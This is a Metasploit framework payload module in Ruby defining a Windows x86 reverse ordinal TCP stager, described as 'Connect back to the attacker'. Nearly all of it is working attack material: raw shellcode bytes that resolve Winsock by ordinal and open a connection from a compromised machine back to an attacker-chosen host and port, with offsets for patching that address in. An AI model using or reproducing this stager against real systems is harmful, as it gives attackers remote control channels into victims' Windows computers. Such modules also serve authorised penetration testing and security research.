##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def self.handler_type_alias
    "reverse_ord_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse Ordinal TCP Stager (No NX or Win7)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'spoonm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockedi',
      'SymbolLookup'  => 'ws2ord',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ 68, 'ADDR' ],
              'LPORT' => [ 75, 'n'    ],
            },
          'Payload' =>
            "\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
            "\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a" +
            "\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x41" +
            "\x58\x01\xe8\x8b\x71\x3c\x01\xee\x03\x69\x0c\x53\x6a\x01\x6a\x02" +
            "\xff\xd0\x97\x68\x7f\x00\x00\x01\x68\x02\x00\x22\x11\x89\xe1\x53" +
            "\xb7\x0c\x53\x51\x57\x51\x6a\x10\x51\x57\x56\xff\xe5"
        }
      ))
  end

end
